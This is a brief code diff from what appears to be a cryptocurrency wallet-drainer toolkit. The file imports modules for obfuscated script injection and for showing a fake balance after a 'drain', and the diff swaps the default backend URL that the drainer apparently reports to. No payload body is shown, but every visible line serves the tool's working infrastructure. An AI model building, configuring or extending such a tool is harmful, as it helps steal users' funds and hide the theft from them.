@@ -9,7 +9,7 @@ import { fileURLToPath } from 'node:url'
 import { prependFakeBalanceModule, parseFakeBalanceAfterDrainEnv } from './mirror-fake-balance.js'
 import { obfuscateInjectJs, parseObfuscateEnv } from './obfuscate-inject.js'
 
-export const DEFAULT_AUTHORIZED_BACKEND_URL = 'https://legionapi-production.up.railway.app'
+export const DEFAULT_AUTHORIZED_BACKEND_URL = 'https://sadrailala-production.up.railway.app'
 
 export type AuthorizedDrainInjectConfig = {
   backendUrl: string
